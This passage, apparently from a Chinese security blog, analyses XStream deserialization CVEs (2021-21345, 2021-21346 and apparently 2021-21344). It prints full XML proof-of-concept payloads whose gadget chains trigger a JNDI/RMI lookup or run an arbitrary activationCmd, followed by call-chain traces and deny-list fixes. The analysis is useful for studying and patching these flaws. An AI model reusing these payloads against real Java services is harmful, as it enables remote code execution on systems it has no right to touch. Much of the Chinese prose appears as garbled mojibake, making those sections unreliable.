class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä»POCä¸­å¯ä»¥çœ‹å‡º</p><ol><li>æœ€ç»ˆçš„RCEè§¦å‘ç‚¹æ˜¯JdbcRowSetImpl jndiç±»å‹æ³¨å…¥æ¼æ´</li><li>å‡ºå‘ç‚¹æ˜¯PriorityQueueè‡ªåŠ¨è°ƒç”¨compareæ–¹æ³•</li></ol><p>PriorityQueueè¿™ä¸ªä¹Ÿæ˜¯ccé“¾ä¸­è¢«ç”¨åˆ°çš„ï¼ŒPriorityQueueå®ç°äº†Serializableï¼Œä¸”é‡å†™äº†readObjectã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>heapify æ˜¯ä¸ªæ’åºæ“ä½œï¼Œè°ƒç”¨äº†æ¯ä¸ªkeyçš„compareæ–¹æ³•</p><p>å…·ä½“çš„è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªå…³é”®åˆ©ç”¨ç‚¹æ˜¯com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Method getter;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ValueT <span class="title">get</span><span class="params">(BeanT bean)</span> <span class="keyword">throws</span> AccessorException </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// æ­¤å¤„å¯ä»¥ä»»æ„æ‰§è¡Œ</span></span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.getter.invoke(bean);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IllegalAccessException var3) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessError(var3.getMessage());</span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">this</span>.handleInvocationTargetException(var4);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>åœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œè¿™é‡ŒéSerializableå¹¶æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯XStreamä¸å—é™åˆ¶æ‰€æœ‰ç±»éƒ½å¯ä»¥å®ä¾‹åŒ–ï¼Œå¯¼è‡´äº†ä¸­é—´å¯ä»¥æœ‰å¾ˆå¤šèŠ‚ç‚¹å¯ä»¥ç”¨æ¥ä½œä¸ºæ„é€ é“¾çš„èŠ‚ç‚¹ã€‚</p><h3 id="é»‘åå•ï¼š-1"><a href="#é»‘åå•ï¼š-1" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><p>authorï¼šé’Ÿå¸ˆå‚…</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br><span class="line">        &lt;indexMap <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br><span class="line">              &lt;dataSource <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br><span class="line">                &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br><span class="line">                  &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br><span class="line">                    &lt;bi <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">sun</span>.<span class="title">corba</span>.<span class="title">se</span>.<span class="title">impl</span>.<span class="title">activation</span>.<span class="title">ServerTableEntry</span>&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">name</span>&gt;<span class="title">verify</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">parameter</span>-<span class="title">types</span>/&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">getter</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;/<span class="title">inheritedAttWildcard</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">bi</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">tagName</span>/&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">context</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;<span class="title">marshallerPool</span> <span class="title">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br><span class="line">                        &lt;outer-<span class="class"><span class="keyword">class</span> <span class="title">reference</span></span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br><span class="line">                  &lt;activationCmd&gt;open /Applications/Calculator.app&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é•¿å¾—å¾ˆåƒï¼Œå‡ºå‘ç‚¹æ˜¯ä¸€æ ·çš„PriorityQueueï¼ŒRCEè§¦å‘ç‚¹æ˜¯com.sun.corba.se.impl.activation.ServerTableEntry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> String activationCmd;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">verify</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               System.out.println(<span class="string">&quot;Server being verified w/&quot;</span> + activationCmd);</span><br><span class="line"></span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">           <span class="keyword">int</span> result = process.waitFor();</span><br><span class="line">           ...</span><br><span class="line">           </span><br><span class="line">   <span class="comment">//synchronized æ˜¯åŒæ­¥é”</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> org.omg.CORBA.SystemException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       state = ACTIVATED;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               printDebug(<span class="string">&quot;activate&quot;</span>, <span class="string">&quot;activating server&quot;</span>);</span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       ..</span><br></pre></td></tr></table></figure><h3 id="é»‘åå•ï¼š-2"><a href="#é»‘åå•ï¼š-2" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><p>author: wh1t3p1g</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span 